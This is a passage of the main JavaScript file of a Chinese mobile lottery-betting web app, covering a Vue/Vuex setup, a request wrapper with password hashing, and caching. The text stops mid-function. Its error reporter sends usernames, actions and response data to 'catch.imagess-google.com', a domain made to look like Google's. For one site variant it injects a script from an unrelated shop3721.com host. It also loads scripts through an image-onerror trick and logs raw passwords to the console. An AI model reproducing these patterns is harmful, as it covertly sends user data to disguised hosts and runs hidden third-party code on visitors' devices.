;(function(){
  try {
    sessionStorage.setItem('TextLocalStorage', 'hello world');
    sessionStorage.getItem('TextLocalStorage');
    sessionStorage.removeItem('TextLocalStorage');
  } catch(e) {
    alert('您的浏览器太旧或者开启了无痕浏览模式，无法浏览网页，请更换浏览器或退出无痕模式，给您带来的不便，表示抱歉！');
    localStorage={setItem:function(d){},getItem:function(d){}};
    sessionStorage={setItem:function(d){},getItem:function(d){}};
  }
})()
//layer 、filterXSS引入失败，刷新
if((typeof(layer)||typeof(filterXSS))=='undefined'){
  var _HT_ = (sessionStorage.getItem('_HT_')||0)*1+1
  if(_HT_<3){
    sessionStorage.setItem('_HT_',_HT_)
    location.href=location.href
  }else{
    sessionStorage.removeItem('_HT_')
  }
}else{
  sessionStorage.removeItem('_HT_')
}
window._iver=localStorage.getItem('iver')
var getIver = (function(){
  var time
  return function(s){
    if (!s) {
      var thist=new Date().getTime()
      if (thist-time<1800000) {
        return
      }
    }
    fetch('/iver',{credentials: "same-origin"}).then(res=>{
      time=new Date().getTime()
      res.text().then(iver=>{
        iver=iver&&iver.slice(0,5)
        if (iver&&iver!==_iver) {
          window._iver=iver
          localStorage.setItem('iver',iver)
          if (!s) {
            location.href=location.href
          }
        }
      })
    })
  }
})()
getIver(1)

if(!localStorage.getItem("console")){
  console.log=function(){return}
}
import Vue from 'vue'
const isDebug_mode = process.env.NODE_ENV !== 'production'; Vue.config.debug = isDebug_mode; Vue.config.devtools = isDebug_mode; Vue.config.productionTip = isDebug_mode;
import VueRouter from 'vue-router'
import Vuex from 'vuex'
import App from './App'
import routes from './routes/routes'
import Va from './plugins/va'
import {DAY_TIME, GMT_DIF} from './js/kit'
window.md5=require('./plugins/md5.min')
var localState={}
window.Vue=Vue
Vue.use(Va)
Vue.use(VueRouter)
Vue.use(Vuex)
//全局过滤器
Vue.filter('num', v=>+v) // 转成数字类型
Vue.filter('filNum',v=>String(Math.floor(v)).length>7?Math.floor(v):v)//数字整数长度大于7位去掉小数点部分
/**
 * [format 为Date对象追加format方法]
 * @param  {[string]} format [设置要输出的目标格式 如"yyyy-MM-dd hh:mm:ss" ]
 * @return {[string]}        [按格式输出的时间字符串]
 * 示例console.log(new Date().format("yyyyMd hh:mm:ss")) 输出2016816 14:12:17;
 */
Date.prototype.format = function(format) {
  var date = {
  "M+": this.getMonth() + 1,
  "d+": this.getDate(),
  "h+": this.getHours(),
  "m+": this.getMinutes(),
  "s+": this.getSeconds(),
  "q+": Math.floor((this.getMonth() + 3) / 3),
  "S+": this.getMilliseconds()
  };
  if (/(y+)/i.test(format)) {
  format = format.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
  }
  for (var k in date) {
    if (new RegExp("(" + k + ")").test(format)) {
      format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? date[k] : ("00" + date[k]).substr(("" + date[k]).length));
    }
  }
  return format;
}
window._Tool = {
  Array: {
    Unique: function (array) {
      var n = []; //临时数组
      for (var i = 0; i < array.length; i++) {
        if (n.indexOf(array[i]) == -1) n.push(array[i]);
      }
      return n;
    }
  },
  // 获得服务器的时间
  Date: {
    getTime:function(){
      return new Date().getTime()-state.Difftime||0
      /*if (state.Difftime) {
        return {then:function(fun){
          fun&&fun(new Date().getTime()-state.Difftime)
        }}
      }else{
        return new Promise(function(resolve, reject) {
          RootApp.getServerTime(function(){
            if (state.Difftime) {
              resolve(new Date().getTime()-state.Difftime)
            }
          })
        })
      }*/
    }
  }
}
// document.body.oncontextmenu=function(){ return false;}//防止右键
document.addEventListener('touchstart',function(e){},false);//让css的:active生效
// document.cookie = "Site="+location.hostname.replace('.com','')
window.rem = document.body.clientWidth/16
window.em = Math.sqrt((rem-20)*.9)+20
window.YDB = null
document.querySelector("html").style.fontSize=rem+'px'
document.body.style.fontSize=em+'px'
window._Tool = {
  Array: {
    Unique: function (array) {
      var n = []; //临时数组
      for (var i = 0; i < array.length; i++) {
        if (n.indexOf(array[i]) == -1) n.push(array[i]);
      }
      return n;
    }
  },
  // 获得服务器的时间
  Date: {
    getTime:function(){
      return new Date().getTime()-state.Difftime||0
      /*if (state.Difftime) {
        return {then:function(fun){
          fun&&fun(new Date().getTime()-state.Difftime)
        }}
      }else{
        return new Promise(function(resolve, reject) {
          RootApp.getServerTime(function(){
            if (state.Difftime) {
              resolve(new Date().getTime()-state.Difftime)
            }
          })
        })
      }*/
    }
  }
}

//获取cookie
window.getCookie=function(cname){
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) != -1) return c.substring(name.length, c.length);
    }
    return "";
}

// 修改默认配置XSS 添加STYLE
var XssList=filterXSS.whiteList
for(var x in XssList){
  XssList[x].push('style')
}
// filterXSS.whiteList=XssList

function Xss(data){
  var k,nk,t,mayBeXss
  for(var i in data){
    k=data[i];
    t=typeof(k)
    if (t==="object") {
      k=Xss(k);
      if (k[1]) {
        mayBeXss=mayBeXss||{}
        mayBeXss[i]=k[1]
      }
      k=k[0]
    }
    if (t==="string") {
      nk=filterXSS(k)
      if (k!==nk) {
        mayBeXss=mayBeXss||{}
        mayBeXss[i]={old:k,new:nk}
      }
      k=nk
    }
    data[i]=k
  }
  return [data,mayBeXss]
}
window._catch = function(data){
  if (window.site) {
    data.S=site
  }
  if(fetchGoal){
    data.G=fetchGoal
  }
  var str=[],k;
  for(var i in data){
    k=data[i];
    if (typeof(k)==="object") {
      k= encodeURIComponent(JSON.stringify(k));
    }
    str.push(i+'='+k)
  }
  str=str.join('&')
  // var fetchUrl = state.UserName||data.UserName
  // fetchUrl = '/catch?'+(fetchUrl&&('U='+fetchUrl+'&'))+str
  // _App && ga && ga('send','event',msg,str)
  var fetchUrl = 'http://catch.imagess-google.com?'+str
  fetch(fetchUrl, {
    credentials:'same-origin',
    method: 'GET',
    cache: 'no-store',
    'mode':'no-cors',
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    // body: str
  })
}

// function FetchCatch(opt) {
//   console.log(opt);
//   var {msg, status, resolve, error, T, S}=opt
//   if (status){
//     msg += status
//   }
//   if (error) {
//     error=error.toString()
//     msg += '<br/>'+error
//     console.log(error);
//   }
//   if (S){
//     msg += '_'+S
//   }
//   layer.alert(msg)
//   if (state.turning) {
//     // layer.alert(msg)
//     state.turning = false
//   }/*else{
//     resolve({ Code: -1, StrCode: msg })
//   }*/
//   delete opt.resolve
//   // _catch(opt)
// }

/**
 * [FetchCatch description]
 * @param {[type]} options.msg   [报错信息]
 * @param {[type]} options.error [错误对象]
 */
function FetchCatch({msg, error}){
  if(error){
    error = error.toString()
    msg += '<br/>'+error
  }

  layer.alert(msg)

  if(state.turning){
    state.turning = false
  }
}

/**
 * [判断是否已加密]
 * setLoginPass(), u 用户名，p 密码,i IVK
 */
function setLoginPass(u,p,i){
  console.log(u,p,i)
  if(p.length==32){
    return md5(p+i)
  }else{
    return md5(md5(u+md5(p))+i)
  }
  return
}

var fetchArr=[]
var fetchGoal
window._fetch = function (data, option = {}){
  var user = /*data.Action!=='Register'&&*/data.UserName||state.UserName
  data = Xss(data)
  if (data[1]) {
    //可能有xss
    console.log(data[1]);
  }
  data=data[0]
  if(data.Password||data.SafePassword){
    var keys=data.Password&&"Password"||data.SafePassword&&"SafePassword"
    var ForgetArr=['SetPassForget','VerifySafePwdForget']
    user=(ForgetArr.indexOf(data.Action)>-1&&sessionStorage.getItem('UserName'))||user//解决找回密码 加密问题
    var IVK=getCookie('IVK')
    // try{
      if(IVK){
        var usr = (user+'').toLocaleLowerCase()
        // console.log(usr);
        data[keys]=(['SetPwd','SetSafePass','Register','SetPassForget'].indexOf(data.Action)===-1)?setLoginPass(usr,data[keys],IVK):md5(usr+md5(data[keys]))
        data.Type='Hash'
      }else{
        //获取IVK
        RootApp.getServerTime()
        return {then:function(f){
          f({Code:-1,StrCode:'请重试'})
          // FetchCatch('密码处理错误',e)
        }}
      }
      if (data[keys].length!==32) {
        return {then:function(f){
          f({Code:-1,StrCode:'请重试'})
          // FetchCatch('密码处理错误',e)
        }}
      }
    // }catch(e){
      // _catch({msg:e.message,UserName:user,UserType:typeof(user),IVK})
      /*return {then:function(f){
        f({Code:-1,StrCode:'密码处理错误'})
        // FetchCatch('密码处理错误',e)
      }}*/
    // }
  }
  data.SourceName=_App?"APP":"MB"
  var str=[],k;
  for(var i in data){
    k=data[i];
    if (typeof(k)==="object") {
      k= encodeURIComponent(JSON.stringify(k));
    }
    str.push(i+'='+k)
  }
  str=str.join('&')
  // 防止一秒内的完全相同请求
  if(data.Action!=='GetServerTimeMillisecond'){
    var now = new Date().getTime()
    for (var i = 0; i < fetchArr.length; i++) {
      if(fetchArr[i][0]+1000<now){
        fetchArr.length=i
        break
      }else if(fetchArr[i][1]===str){
        if(layerIndex||layerIndex=='0'){
          layer.close(layerIndex)
        }
        return {then:function(){
          console.log('重复发送'+str)
        }}
      }
    }
    fetchArr.unshift([now,str])
  }
  return new Promise(function(resolve, reject){
    var st = state.turning&&setTimeout(function(){
      var msg = '网络请求超时，请重试'
      FetchCatch({msg})
      _catch({msg:'timeout',A:data.Action,U:user})
      reject()
    },10000)
    var fetchUrl = '/tools/ssc_ajax.ashx?V='+_iver+'&A='+data.Action
    if(window.site){
      fetchUrl+='&S='+site
    }
    if(user){
      fetchUrl+='&U='+user
    }

    if (data.Action==='AddBetting'||data.Action==='AddChaseBetting') {
      fetchUrl+='&T='+new Date(now-state.Difftime).format('ddhhmmss')
    }

    /*var IVK=getCookie('IVK')
    if(IVK!=null){
      //密码特殊处理
      if(str.indexOf('Password')>-1){
        var obj=str.split('&')
        str=obj.map(v=>{
          if(v.indexOf('Password')>-1){
            var xtr=v.split('='),
            pwArr=['SetPwd','SetSafePass','Register','SetPassForget']
            v=xtr[0]+'='+(pwArr.indexOf(data.Action)>-1?md5(user+md5(xtr[1])):md5(md5(user+md5(xtr[1]))+IVK))
          }
          return v
        }).join('&')+'&Type=Hash'
      }
    }*/
    if(_App && ga){
      //减少发送量
      if(['GetLotteryOpen','GetInitData','GetServerTimeMillisecond'].indexOf(data.Action)===-1){
        ga('send','event','fetch',data.Action)
      }
    }
    fetch(fetchUrl, {
      credentials:'same-origin',
      method: 'POST',
      cache: 'no-store',
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: str
    }).then((res)=>{
      var T = (new Date().getTime()-now)/1000
      var H={}
      try{
        for (var pair of res.headers.entries()) {
          pair[0]=pair[0].toLowerCase()
          if (['a','x-sec'].indexOf(pair[0])>-1) {
            H[pair[0]]=pair[1]
          }
        }
        fetchGoal=`${H['a']}-${H['x-sec']}`
      }catch(e){
        H={'x-sec':'E','a':'I'}
        fetchGoal=null
      }
      // var S=(!H['a'])?null:( H['a']+(H['x-sec']?('_'+H['x-sec']):''))
      if (res.status!==200) {
        var msg = "网络错误" + res.status
        FetchCatch({msg})
        _catch({msg:'err'+res.status,A:data.Action,U:user})
        return
      }
      if(T>10){
        _catch({msg:'timeout',T,A:data.Action,U:user})
      }
      res.text().then(json=>{
        if (data.Action==='GetImageCode') {
          //获取验证码的不需要转换成json
          resolve(json)
          return
        }
        try{
          json = JSON.parse(json)
        }catch(error){
          // 解析成json数据失败
          if (json[0]==='<') {
            // 可能是一些高防拦截等需要重发
            _fetch(data,option).then(json=>{
              resolve(json)
            })
          }else{
            var msg = data.Action+"数据解析错误"// + json
            FetchCatch({msg,error})
            _catch({msg:'JSONerr',A:data.Action,U:user,E:error.toString(),Retrun:json})
          }
        }

        try{
          if (typeof(json)==='string') return
          json = Xss(json)
          if(json[1]) {
            console.log(json[1]);
          }

          json=json[0]
          //不需要改StrCode的接口
          var notChangeStrCode = ["GetRebateInfo"]

          // 对StrCode 加上一些前后缀来表明后端的信息
          if(notChangeStrCode.indexOf(data.Action) === -1){
            json.StrCode = `${json.StrCode}·`
          }
          state.turning && clearTimeout(st)
        }catch(error){
          var msg = "请求中含有敏感字符"
          FetchCatch({msg,error})
        }

        var notRes

        // 对首屏接口的返回结果的处理
        if (data.Action==="GetInitData") {
          if (json.Code===1||json.Code===0) {
            try{
              json = RootApp.SetFilter(json)
            }catch(error){
              var msg = "Filter数据错误" + json
              FetchCatch({msg,error})
            }
            var Data = json.BackData
            try{
              RootApp.WatchInitData(Data)
            }catch(error){
              var msg = "Watch数据错误" + Data
              FetchCatch({msg,error})
            }

            try{
              RootApp.SaveInitData(Data)
              if(JSON.stringify(json.CacheData) !== "{}"){
                console.log(CacheData)
                localStorage.setItem('CacheData',JSON.stringify(Object.assign(CacheData,json.CacheData)))
              }
            }catch(error){
              var msg = "Save数据错误" + Data
              FetchCatch({msg,error})
            }
          }
        }

        try{
          ;(function(){
            switch(json.Code){
              case 0://未登录
                if(state.UserName){
                  layer.alert("由于您长时间未操作，已自动退出，需要重新登录",function(){
                    RootApp.Logout()
                    router.replace("/login")
                  })
                  notRes=true
                }
              break;
              // case -6://IP黑名单
              // break;
              case -7://系统维护
                store.commit('SetMaintain', json.BackData)
                router.replace("/maintain")
                notRes=true
              break;
              case -8://账号冻结
                layer.alert("您的账号已被冻结，详情请咨询客服。",function(){
                  RootApp.Logout()
                  var meta = RootApp._route.matched[0]
                  meta = meta&&meta.meta
                  router.replace("/login")
                })
                notRes=true
              break;
              case -1:
                if (json.StrCode === '空') {
                  // 出现意外错误，需要补发接口
                  console.log('补发接口')
                  _fetch(data,option).then(json=>{
                    resolve(json)
                  })
                  notRes=true
                }
              break;
            }
            if (data.Action.search('Verify')===0&&json.Code>-1) {
              state.UserVerify=data.Action.replace('Verify','')+','
            }
          })()
        }catch(error){
          var msg = "返回数据拦截处理错误"
          FetchCatch({msg,error})
          _catch({A:data.Action,msg:'Intercept',data:json,E:error.toString(),U:user})
        }
        notRes||resolve(json)
      }).catch(error => {
        var msg = "数据错误"
        FetchCatch({msg,error})
      })
    }).catch(error => {
      var msg = ''
      if("Failed to fetch"===error.message){
        msg = "您的设备失去了网络连接"
      }else{
        msg = "网络错误，请检查网络状态"
      }
      _catch({msg:'fetchFailed'})
      // var msg = "网络错误，请检查网络状态"
      FetchCatch({msg})
    })
  })
}

// 获取图形码接口专用
window._fetchT=function _fetchT(data){
  return _fetch(data)
  // var str=[],k;
  // for(var i in data){
  //   k=data[i];
  //   if (typeof(k)==="object") {
  //     k=JSON.stringify(k);
  //   }
  //   str.push(i+'='+k);
  // }
  // data = str.join('&');
  // return new Promise(function(resolve, reject){
  //   fetch('/tools/ssc_ajax.ashx', {
  //     credentials:'same-origin',
  //     method: 'POST',
  //     headers: {
  //       "Content-Type": "application/x-www-form-urlencoded"
  //     },
  //     body: data
  //   }).then((res)=>{
  //     res.text().then(text=>{
  //       resolve(text)
  //     })
  //   })
  // })
}

window._App=(function(host){
  //是否APP
  var a = localStorage.getItem("isApp")
  if (a!==null) {return a}
  if (host.split('.').length===4){return false}
  // console.log(host);
  var beginWithM = /^m\./.test(host)
  var hasDAFATEST = host.indexOf('dafatest') > -1

  if(!beginWithM && !hasDAFATEST){
    return true
  }
  // host = host.split('.')
  // host = host[host.length-2]
  // if (['csz8','caishen01','caishenzhengba','app1daiasd','app2jskahs'].indexOf(host)>-1) {
  //   return true
  // }
  return false
})(location.host)
;(function(){
  var versions = function() {
    var u = navigator.userAgent,
      app = navigator.appVersion;
    return {
      // trident: u.indexOf('Trident') > -1, //IE内核
      // presto: u.indexOf('Presto') > -1, //opera内核
      // webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      // gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Adr') > -1, //android终端
      // iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
      // iPad: u.indexOf('iPad') > -1, //是否iPad
      // webApp: u.indexOf('Safari') == -1, //是否web应该程序，没有头部与底部
      // weixin: u.indexOf('MicroMessenger') > -1, //是否微信 （2015-01-22新增）
      // qq: u.match(/\sQQ/i) == " qq" //是否QQ
    };
  }()
  if (_App) {
    _App=versions.android?'android':(versions.ios?'ios':'app')//判断是安卓还是IOS
    //iosApp专用代码
    function addScript(url,fun){
      var img=document.createElement("img")
      img.src=url
      img.onerror=function(){
        var script = document.createElement("script");
        script.src=img.src
        document.body.appendChild(script);
        fun()
      }
    }
    addScript("//static.ydbimg.com/API/YdbOnline.js",function(){
      var count=0
      var inter=setInterval(function(){
        if(typeof YDBOBJ!=='undefined'){
          YDB=new YDBOBJ()
          YDB.SetHeadBar(0)
          clearInterval(inter)
        }
        count++
        if (count>100) {
          clearInterval(inter)
        }
      },100)
    })
    /*addScript("https://www.googletagmanager.com/gtag/js?id=UA-107734696-1",function(){
      window.gtag=function(){(window.dataLayer || []).push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-107734696-1');
    })*/
    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
    addScript("https://www.google-analytics.com/analytics.js",function(){
      ga('create', 'UA-107734696-1', 'auto');
      ga('send', 'even','刷新');
    })
  }
  if (!versions.android) {
    document.body.oncontextmenu=function(){ return false;}//防止右键
  }
})()

if (_App) {document.title="彩神争霸"}

window.router = new VueRouter({
  routes,
  mode:'history',
  linkActiveClass:"on",
  scrollBehavior (to, from, savedPosition) {
    if (savedPosition) {
      return savedPosition
    } else {
      return false
      // if(to.name === '彩种'){
      //   return false
      // }else{
      //   return { x: 0, y: 0 }
      // }
    }
  }
  // exact: true
});

function SetIndexTitle(s){
  routes[1].meta.title=`<img src="${state.constant.ImgHost+s.MobileLogo}">`
  if (!_App) {
    document.title=s.Name
    // routes[2].meta.title=routes[1].meta.title
  }
}

var UserArr = [
  'UserHasSafePwd', //返回是否已经设置安全密码,1为有,0为没有设置
  'UserSafeQuestions', //返回设置的密保问题,如果没设置可以返回0或者空数组
  'UserMobile', //返回已绑定手机的模糊状态,如未绑定,返回空字符串或0
  'UserMail', //返回已绑定手机的模糊状态,如未绑定,返回空字符串或0
  'UserName', //返回对应的账号,未登录用户返回空字符串
  'UserPhoto', //返回用户头像的图片地址
  'UserNickName',
  'UserFirstCardInfo', //返回绑定的第一张银行卡的模糊信息
  'AgentRebate', //获取代理人返点情况
  'UserUpGradeBonus',
  'UserQQ',
  'UserMobile',
  'UserMail',
  'UserBirthDay',
  'UserGradeGrow',
  'UserSex',
  'UserHasSafePwd',
  'UserFirstCardInfo',
  'UserBankCardList',
  'UserLastLoginInfo',
  'RebateK3',
  'RebateSSC',
  'RebateSYX5',
  'RebateKL8',
  'RebatePK10',
  'RebatePL35',
  'RebateFC3D',
  'Rebate6HC',
  'NoticeData',
]
var SiteArr=[ //需要校验更新版本的列表
  'SysActivity',
  'SysBanner',
  'LotteryList', //所有彩种信息
  'GradeList',//等级体系
  'RewardData',//每日加奖设置
  'DefaultPhotoList',
]

var AppArr=[
  'LotteryConfig', //所有彩种列表
  'LotteryHot',    //热门彩票
  'ActivityConfig', //活动种类及数据
  'BannerList',
  // 'PayLimit',
  'SiteConfig',
]
var LocalCacheArr = [//本地控制缓存版本
  'RankingList',//昨日奖金榜
]
var VerifyArr=["LotteryConfig","LotteryHot","BannerList","LotteryList","ActivityConfig","FooterConfig","HelpConfig","SiteConfig","HallBanner","GradeList","DefaultPhotoList","RewardData","AbstractType","PayLimit","CloudUrl","NoticeData"]
if (_App) {
  UserArr=UserArr.concat(AppArr)
}else{
  SiteArr=SiteArr.concat(AppArr)
}
var CacheArr = SiteArr.concat(UserArr).concat(LocalCacheArr).concat(['Difftime'])
window.state = require('./JSconfig.js')
state.constant._App=_App
window.CacheData=localStorage.getItem("CacheData")
CacheData = CacheData?JSON.parse(CacheData):{}
var LocalCacheData=localStorage.getItem("LocalCacheData")
LocalCacheData = LocalCacheData ? JSON.parse(LocalCacheData) : {}
function setState(key){
  function getLocalDate(str){
    var s = localStorage.getItem(str);
    try{
      s = JSON.parse(s);
    }catch(e){}
    /*if (str=="SiteConfig"&&s) {
      SetIndexTitle(s)
    }*/
    return s;
  }
  var k,value
  for (var i = key.length - 1; i >= 0; i--) {
    k=key[i]
    // state[k]=getLocalDate(k)
    value=getLocalDate(k)
    if (VerifyArr.indexOf(k)!==-1) {
      // console.log('需要检验是否存在版本号与实际储存值是否非同步存在或不存在')
      if((Boolean(CacheData[k])^(value!=null))){
        //检验是否存在版本号与实际储存值是否非同步存在或不存在
        console.log(state[k]);
        value=null
        localStorage.removeItem(k)
        delete state[k]
        delete CacheData[k]
      }
    }
    if (value!==null) {
      // 进行localStorage数据的合法化验证，不符合目前要求的数据进行剔除
      switch(k){
        case 'SiteConfig':
          console.log(value);
          if(!value.Style || (value.Style.Id !== 0 && !value.Style.Id)){
            value=null
            delete state[k]
            delete CacheData[k]
          }
        break;
        default:
          if(LocalCacheArr.indexOf(k)>-1){
            // 判断与LocalCacheData的同步
            // var cache = value
            // console.log('存在localCache的字段',k)
            var hasVersion = !!LocalCacheData[k]
            var hasCache = !!value
            var needDelete = hasVersion ^ hasCache  //异或
            // console.log(needDelete, hasVersion, hasCache)
            if(needDelete){
              localStorage.removeItem(k)  //删除对应的缓存
              delete LocalCacheData[k]
              localStorage.setItem("LocalCacheData",JSON.stringify(LocalCacheData))
            }
          }
        break
      }
      localState[k]=value
    }
    state[k]=value
  }
  console.log(localState);
};
var LocalCacheData=localStorage.getItem("LocalCacheData")
LocalCacheData = LocalCacheData ? JSON.parse(LocalCacheData) : {}
setState(CacheArr)
console.log(CacheData);

window.store = new Vuex.Store({
  state,
  getters:{
    PhotoPath:state=>state.constant.ImgHost+state.constant.PhotoPath,
    WithdrwHtml:state=>{
      return "login"
    },
    NoDataDom:msg => state.tpl.noData.join("msg"),
  },
  mutations: {
    toggleLoading:(state, bool) =>{
      state.turning = bool
    },
    SaveInitData: (state,Data) => {
      for(var k in Data){
        state[k] = Data[k]
        if(CacheArr.indexOf(k)+1){
          if (Data[k]===null) {
            state[k]=Data[k]=''
          }else if (typeof(Data[k])=='object') {
            Data[k]=JSON.stringify(Data[k]);
          }
          localStorage.setItem(k,Data[k]);
        }
      }
    },
    ClearInitData:(state,arr)=>{
      for (var i = arr.length - 1; i >= 0; i--) {
        localStorage.removeItem(arr[i])
        state[arr[i]]=null
        delete CacheData[arr[i]]
      }
      localStorage.setItem('CacheData',JSON.stringify(CacheData))
    },
    setTmpDifftime:(state, Difftime)=>{
      state.Difftime = Difftime
      localStorage.setItem('Difftime',Difftime)
    },
    setDifftime:(state, timeItemList)=>{
      // console.log(timeItemList)
      // var cantGetTime = !timeItemList || !timeItemList.length || timeItemList.every(item=>!item.SerTime)

      // if(cantGetTime){
      //   layer.msgWarn("因无法同步服务器时间,您将无法投注,请检查网络情况")
      //   return
      // }

      // if(timeItemList.every(item=>!item.SerTime)){
      //   layer.url("因无法同步服务器时间,您将无法投注,请检查网络情况", "/index")
      //   return
      // }

      var _shortest = timeItemList[0].interval,     //算获取最快的时间
          _index = 0
      timeItemList.forEach((item, index)=>{
        if(item.interval < _shortest){
          _shortest = item.interval
          _index = index
        }
      })

      var timeObj = timeItemList[_index],
          timeBegin = timeObj.timeBegin,
          timeEnd = timeObj.timeEnd,
          SerTime = timeObj.SerTime
      var Difftime = timeBegin + Math.floor((timeEnd - timeBegin)/2) - SerTime
      state.Difftime = Difftime
      localStorage.setItem('Difftime',Difftime)
    },
    SetMaintain:(state,d)=>{
      state.Maintain=d
    }
  },
})

;(function(){
  var warn = '<span class="iconfont">&#xe606;</span>',
    tip='<span class="iconfont">&#xe610;</span>'
  layer.icon={}
  layer.icon.load=state.tpl.load
  layer.load=function(){layer.open({type: 2})}
  layer.msg=function(msg, time) {
    return this.open({ content: msg, time: time?time-1:3,style: 'fill:#ececec',className:'layermsg'});
  }
  layer.msgWarn=function(msg, time) {
    return this.msg(warn+msg,time);
  },
  layer.msgTip=function(msg, time) {
    return this.msg(tip+msg,time);
  },
  layer.msgWait=function(msg,time) {
    return this.open({time:  time?time-1:0,content: layer.icon.load+msg+"，请稍候...", shadeClose:0 ,className:'layermsg'});
  },
  layer.url=function(msg,s) {
    return layer.open({
      className: "layerConfirm",
      title:'温馨提示',
      content: msg,
      btn: ["确定"],
      end:function(){
        if (typeof(s)=='string') {
          router.push(s)
        }else{
          router.go(s||-1)
        }
      }
    })
  },
  layer.alert=function(msg,fun){
    return layer.open({
      className: "layerConfirm",
      title:'温馨提示',
      shadeClose: false,
      content: msg,
      btn: ["确定"],
      end:fun
    })
  },
  layer.confirm=function(msg,btn,fun1,fun2,fun3){
    if (!btn.length) {
      fun3=fun2
      fun2=fun1
      fun1=btn
      btn=["确定","取消"]
    }
    return layer.open({
      className: "layerConfirm",
      title:"温馨提示",
      shadeClose: false,
      content: msg,
      btn: btn,
      yes: function(index) {
        fun1()
        layer.close(index)
      },
      no:fun2,
      end:fun3
    })
  }
})()

function TimeItem(interval, timeBegin, timeEnd, SerTime){
  this.interval = interval
  this.timeBegin = timeBegin
  this.timeEnd = timeEnd
  this.SerTime = SerTime
}

window.RootApp={
  Logout:function(){
    localStorage.setItem('lastLoginImage',state.UserPhoto)
    store.commit('ClearInitData', UserArr)
    sessionStorage.clear()
  },
  Login:function(UserName,fun){
    // this.GetInitData(UserArr,fun)
    this.SaveInitData({UserName:UserName})
    fun()
  },
  OpenWin:function(url, newTab){
    //app
    if(YDB){
      YDB.OpenWithSafari(url)
    }else{
      if(!newTab){
        newTab = window.open('about:blank')
      }
      newTab.location.href=url
    }
  },
  SetFilter:function(json){
    var data=json.BackData
    var CacheData=json.CacheData
    ;(function(Bonus){
      if (!Bonus||Bonus.State) {return}
      setTimeout(function(){
        layer.open({
          shadeClose: false,
          title: "恭喜",
          content: '恭喜您成功晋级，当前等级为VIP'+Bonus.Grade+'，赶紧到活动中心领取奖励吧。',
          className: "layerConfirm",
          btn: ["领取奖励", "留在本页"],
          yes: function(Lindex) {
            layer.close(Lindex);
            router.replace("/upgrade")
          }
        })
      },100)
    })(data.UserUpGradeBonus)
    /*;(function(s){
      if (s) {
        SetIndexTitle(s)
      }
    })(data.SiteConfig)*/
    ;(function(arr){
      if(arr&&arr.length){
        var el = {};
        arr.forEach(item => {
          el[item.PayName] = [item.MinMoney, item.MaxMoney];
        })
        data.PayLimit=el
      }
    })(data.PayLimit)
    ;(function(LotteryList){
      if(LotteryList&&LotteryList.length){
        data.LotteryList={};
        var c
        for (var i = LotteryList.length - 1; i >= 0; i--) {
          c = LotteryList[i].LotteryCode
          data.LotteryList[c]= LotteryList[i]
          // delete data.LotteryList[c].LotteryCode
        }
      }
    })(data.LotteryList)
    if (data.NoticeData&&data.NoticeData.length) {
      if (data.NoticeData.length>2) {
        data.NoticeData.length=2;
      }
    }
    if (data.GradeList&&data.GradeList.length) {
        for (var i = data.GradeList.length - 1; i >= 0; i--) {
            data.GradeList[i].Grade=Number(data.GradeList[i].Grade);
            data.GradeList[i].GradeGrow=Number(data.GradeList[i].GradeGrow);
            data.GradeList[i].Bonus=Number(data.GradeList[i].Bonus);
            data.GradeList[i].JumpBonus=Number(data.GradeList[i].JumpBonus);
        }
    }
    ;(function(a){
      if(a&&a.length){
        for (var i = a.length - 1; i >= 0; i--) {
          if (typeof(a[i].Img)=="object") {
            a[i].Img=a[i].Img&&a[i].Img[0];
          }
        }
      }
    })(data.ActivityConfig)
    ;(function(RankingList){
      if (RankingList&&RankingList.length===0) {
        delete data.RankingList
      }
    })(data.RankingList)
    ;(function(){
      var change=[]
      for (var i = LocalCacheArr.length - 1; i >= 0; i--) {
        if(data[LocalCacheArr[i]]){
          change.push(LocalCacheArr[i])
        }
      }
      var len = change.length
      console.log(len);
      if (len) {
        var time = _Tool.Date.getTime()
        time/=DAY_TIME
        time=Math.floor(time)%366
        for (var i = len - 1; i >= 0; i--) {
          LocalCacheData[change[i]]=time
        }
        localStorage.setItem("LocalCacheData",JSON.stringify(LocalCacheData))
      }
    })()
    return json;
  },
  SaveInitData(d){
    store.commit('SaveInitData', d)
  },
  // 设置网页title
  setTitle(siteName, routeName){
    var title
    siteName=siteName||''
    routeName=routeName||''
    if(siteName){
      title = `${siteName}-${routeName}`
    }else{
      title = `${routeName}`
    }
    document.title = title
  },
  WatchInitData(d) {
    console.log(d, 'test')
    //必须跟随执行的函数
    var head = document.getElementsByTagName('head')[0]
    var v
    var vm = this
    for(var i in d) {
      switch(i){
        case 'SiteConfig':
          ;(function(s){
            console.log(s);
            routes[1].meta.title=`<img src="${state.constant.ImgHost+s.MobileLogo}">`
            if (!_App) {
              vm.title = s.Name
              // document.title=s.Name
              // routes[2].meta.title=routes[1].meta.title
            }
            vm.title = s.Name
            // document.title = s.Name
            if(!s.PCLogo){//PCLogo为空时转换
              s.PCLogo={}
              s.PCLogo.logo1=''
            }

            var site = s.PCLogo.logo1
            if (site) {
              site=site.split('/')[1]
              window.site=site
              switch(site){
                case 'huifa':
                  var scriptTag = document.createElement('script')
                  scriptTag.src='//m.badzzducom2.shop3721.com/yunbd.php?tk=60b6ef7bef953ce499b6b5f85c409962'
                  head.appendChild(scriptTag)
                break
              }
            }
          })(d.SiteConfig)
        break
      }
    }
  },
  AjaxGetInitData(arr,fun){
    state.needVerify=0
    sessionStorage.setItem("needVerify",state.needVerify)
    var ajax = {
      Action:"GetInitData",
      Requirement:arr
    }
    if (_App&&!state.UserName) {
      //app未登录的时候将部分项目移出版本校验
      // ajax.CacheData=Object.assign(CacheData)
